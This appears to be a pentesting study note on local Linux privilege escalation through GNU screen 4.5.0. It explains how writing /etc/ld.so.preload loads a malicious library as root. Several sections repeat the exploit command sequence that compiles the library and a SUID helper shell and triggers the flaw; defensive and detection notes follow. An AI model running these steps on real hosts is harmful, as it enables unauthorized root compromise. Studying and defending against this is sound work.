---
tags: [htb, pentesting, linux, privilege-escalation]
aliases: [Vulnerable Services]
date: 2026-03-17
topic: Vulnerable Services
type: deep-study
difficulty: intermediate
status: new
category: privesc
tools: [screen, gcc, searchsploit]
---

# Vulnerable Services

## Related Topics

- [[Linux Privilege Escalation]]
- [[Linux Privilege Escalation Playbook]]
- [[Technique Registry]]
- [[Post Exploitation]]

## Concept Overview

Vulnerable services are locally installed daemons or helper programs that expose a privilege escalation path because of weak permissions, unsafe design, or known software flaws. In Linux privilege escalation, these services matter because they often run as root or ship with SUID bits, which means a normal user can transform a local code execution bug into full system compromise.

The key idea is that local enumeration is not only about users, groups, and sudo rights. It is also about identifying software versions and mapping them against known exploits. If the service is privileged and the version is vulnerable, exploitation can be faster and more reliable than attempting kernel attacks.

In this lesson, the example is GNU `screen` version 4.5.0. That release can be abused because of unsafe handling around log file creation, allowing an attacker to influence `/etc/ld.so.preload` and force the dynamic linker to load a malicious shared object as root.

## Decision Tree

```text
Do I have local shell access?
    |
    +-- Yes -> Enumerate versions of privileged services
                |
                +-- Vulnerable version found?
                        |
                        +-- Yes -> Confirm SUID or root execution context
                                |
                                +-- Public exploit available?
                                        |
                                        +-- Yes -> Check prerequisites and execute
                                        +-- No -> Research manual abuse path
                        +-- No -> Continue other privesc checks
```

## Knowledge Graph

- [[Technique Registry]]
- [[Pentesting Knowledge Map]]

## Internal Mechanics

- Many local services interact with files, sockets, logs, or plugins using elevated privileges.
- If a privileged binary performs unsafe file creation or library loading, attackers can redirect that behavior into arbitrary code execution.
- In the `screen` 4.5.0 case, exploitation abuses the dynamic loader feature `/etc/ld.so.preload`, which forces shared libraries to load before normal program execution.
- By writing a malicious library path into that file, the attacker ensures root-owned processes load attacker code.
- The malicious constructor changes ownership and permissions of a shell binary, producing a SUID root shell.

## Enumeration Checklist

Commands typically used to detect this condition during enumeration.

```bash
id
uname -a
hostnamectl
find / -perm -4000 -type f 2>/dev/null
screen -v
ls -l /usr/bin/screen
dpkg -l | grep screen
rpm -qa | grep screen
ps aux
searchsploit screen 4.5.0
```

## Attack Methodology

Typical attacker workflow.

1. Enumerate installed services and SUID binaries.
2. Identify a vulnerable privileged binary such as `screen` 4.5.0.
3. Validate exploit prerequisites like compiler access and writable temporary storage.
4. Build a malicious shared object and helper shell.
5. Abuse the vulnerable service to write `/etc/ld.so.preload`.
6. Trigger library loading as root.
7. Launch the newly created SUID shell and verify root.

## Decision Workflow

Condensed attacker workflow used during real engagements.

1. Enumerate version information.
2. Correlate versions with public exploits.
3. Confirm the binary executes with privilege.
4. Prepare exploit artifacts.
5. Trigger the vulnerable behavior.
6. Confirm escalation with `id`.

## Decision Engine

See:

[[Privilege Escalation Decision Tree]]

## Attack Chain

Step-by-step chain from initial discovery to privilege escalation.

1. Gain low-privilege shell on Linux host.
2. Discover `screen` is installed and running version 4.5.0.
3. Confirm the `screen` binary is SUID-root or otherwise executes in a privileged context.
4. Compile a malicious shared object that changes ownership and mode on a shell binary.
5. Compile a helper shell that will become SUID-root.
6. Abuse `screen` logging behavior to create `/etc/ld.so.preload` containing the attacker library.
7. Trigger library loading and remove the preload file during execution.
8. Execute the SUID shell to obtain root.

## Practical Example

Example penetration testing scenario.

```bash
screen -v
ls -l /usr/bin/screen
gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c
gcc -o /tmp/rootshell /tmp/rootshell.c -Wno-implicit-function-declaration
cd /etc
umask 000
screen -D -m -L ld.so.preload
screen -ls
/tmp/rootshell
id
```

What each step does:

- `screen -v` confirms the vulnerable version.
- `ls -l /usr/bin/screen` checks whether the binary has dangerous privileges.
- The `gcc` commands create the malicious library and helper shell.
- `screen -D -m -L ld.so.preload` abuses logging to influence `/etc/ld.so.preload`.
- `screen -ls` triggers the vulnerable code path.
- `/tmp/rootshell` starts a shell with root effective permissions.

## Command Cheat Sheet

Quick reference commands for exploitation.

```bash
screen -v
ls -l /usr/bin/screen
searchsploit screen 4.5.0
gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c
gcc -o /tmp/rootshell /tmp/rootshell.c -Wno-implicit-function-declaration
cd /etc
umask 000
screen -D -m -L ld.so.preload
screen -ls
/tmp/rootshell
id
```

## Command Harvest

Commands in this section are automatically eligible to be copied into
the global cheat sheet located at:

    cheatsheets/Pentest Commands.md

Only include the most important practical commands used during real
penetration tests.

```bash
screen -v
searchsploit screen 4.5.0
screen -D -m -L ld.so.preload
screen -ls
/tmp/rootshell
id
```

## Attack Paths

Possible escalation chains from this technique.

- -> [[Linux Privilege Escalation]]
- -> [[Post Exploitation]]

## Real World Scenario

Legacy utility packages often remain installed for operational convenience on jump boxes, lab hosts, and internal admin systems. If one of these packages retains a SUID bit while also containing a known local privilege escalation bug, an attacker with even limited shell access can often convert that foothold into root within minutes.

Examples include:

- enterprise Linux servers carrying outdated support packages after in-place upgrades
- development or training systems where patching is inconsistent
- red team engagements where obscure SUID utilities are overlooked during hardening

## Tools

Common tools associated with this technique.

- `screen`
- `gcc`
- `searchsploit`
- [[Nmap]]

## Defensive Perspective

- Remove unnecessary SUID bits from non-essential binaries.
- Patch legacy packages quickly, especially utilities reachable by unprivileged users.
- Monitor writes to `/etc/ld.so.preload` because that file is highly sensitive.
- Alert on suspicious compilation activity and execution of temporary binaries from `/tmp`.
- Limit local compiler availability on hardened systems where practical.

## Detection Indicators

Signs defenders may observe if this attack occurs.

- Execution of vulnerable `screen` binaries by low-privilege users.
- Unexpected creation or modification of `/etc/ld.so.preload`.
- Shared objects or shell binaries appearing in `/tmp`.
- Sudden ownership or permission changes that create SUID shells.
- Root shell execution from non-standard temporary paths.

## Practice Lab Idea

Suggested way to reproduce this scenario in a lab.

1. Build a Linux VM with an intentionally vulnerable `screen` installation.
2. Ensure the binary runs with the permissions needed to reproduce the flaw.
3. Log in as a low-privilege user and enumerate installed versions.
4. Compile the proof-of-concept exploit in `/tmp`.
5. Trigger the vulnerability and validate root access.
6. Review logs and filesystem artifacts from a defender perspective.

## Key Insights

- Service version enumeration can reveal faster local privesc paths than broader exploit hunting.
- A file-write primitive to `/etc/ld.so.preload` is often equivalent to full root compromise.
- Public exploits are useful, but understanding the mechanism helps adapt when scripts fail.
- Temporary exploit artifacts are noisy and can be valuable for blue-team detection.
